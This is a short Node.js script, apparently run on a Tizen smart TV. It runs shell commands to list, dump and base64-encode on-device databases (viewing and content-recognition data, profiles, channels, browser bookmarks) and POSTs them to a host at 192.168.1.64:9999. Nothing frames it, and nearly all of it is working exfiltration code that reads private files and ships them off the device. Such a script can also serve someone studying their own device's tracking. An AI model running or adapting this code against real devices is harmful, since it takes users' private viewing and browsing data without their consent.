"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}

function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 45000 }).slice(0, cap || 12000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();
out.sizes = sh("ls -la /opt/dbspace/.avoc.db* /opt/usr/apps/slive-provider/data/*.db /opt/usr/apps/context-aware-service/data/channel.db /opt/usr/apps/org.tizen.homedatacontrol-service/data/data.db /opt/usr/data/browser-provider/database/*.db 2>&1");
out.avoc_strings = sh("strings /opt/dbspace/.avoc.db-wal 2>/dev/null | head -c 9000");
out.sqlite3 = sh("which sqlite3; find /usr /opt -name 'sqlite3' -type f 2>/dev/null | head -3");
post("/dbdump1", out);

var out2 = {};
out2.avoc_db_b64 = sh("base64 /opt/dbspace/.avoc.db | head -c 100000", 110000);
out2.freesia_b64 = sh("for f in /opt/usr/apps/slive-provider/data/freesia_ontv_0.db /opt/usr/apps/slive-provider/data/profile.db; do echo FILE:$f; base64 $f | head -c 45000; echo; done", 100000);
out2.channel_b64 = sh("base64 /opt/usr/apps/context-aware-service/data/channel.db | head -c 30000", 35000);
out2.hdcontrol_b64 = sh("base64 /opt/usr/apps/org.tizen.homedatacontrol-service/data/data.db | head -c 30000", 35000);
out2.bookmarks_b64 = sh("base64 /opt/usr/data/browser-provider/database/.browser-provider-bookmarks.db | head -c 30000", 35000);
out2.acr_engine = sh("ls -laR /opt/usr/apps/NSF/empACREngine_mount 2>&1 | head -40");
post("/dbdump2", out2);
